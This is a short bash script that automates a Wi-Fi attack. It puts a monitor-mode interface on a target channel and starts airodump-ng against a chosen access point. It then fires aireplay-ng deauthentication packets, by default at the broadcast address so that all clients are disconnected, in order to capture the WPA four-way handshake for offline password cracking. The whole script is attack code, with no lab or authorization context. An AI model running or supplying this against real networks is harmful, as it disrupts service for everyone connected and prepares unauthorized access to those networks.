#!/bin/bash

# Configuration variables
INTERFACE="wlan0mon"   # Your monitor mode interface
BSSID="XX:XX:XX:XX:XX:XX"  # Target BSSID
CHANNEL=6  # Target channel
CLIENT="FF:FF:FF:FF:FF:FF"  # Use broadcast address to deauth all clients or specify a client MAC
CAPTURE_FILE="/path/to/save/capture.cap"

# Check if user is root
if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root" 1>&2
   exit 1
fi

# Start listening on the correct channel
echo "Setting channel $CHANNEL on $INTERFACE..."
iwconfig $INTERFACE channel $CHANNEL

# Start airodump-ng to capture the 4-way handshake
echo "Starting capture on $INTERFACE. Press Ctrl+C to stop."
airodump-ng --bssid $BSSID --channel $CHANNEL --write $CAPTURE_FILE $INTERFACE &

AIRODUMP_PID=$!
sleep 2

# Send deauthentication packets
echo "Sending deauth packets to BSSID $BSSID on channel $CHANNEL..."
aireplay-ng --deauth 10 -a $BSSID -c $CLIENT $INTERFACE

# Allow some time to capture the handshake
sleep 5

# Kill airodump-ng
kill $AIRODUMP_PID
wait $AIRODUMP_PID 2>/dev/null

echo "Capture complete. Check $CAPTURE_FILE for the handshake."
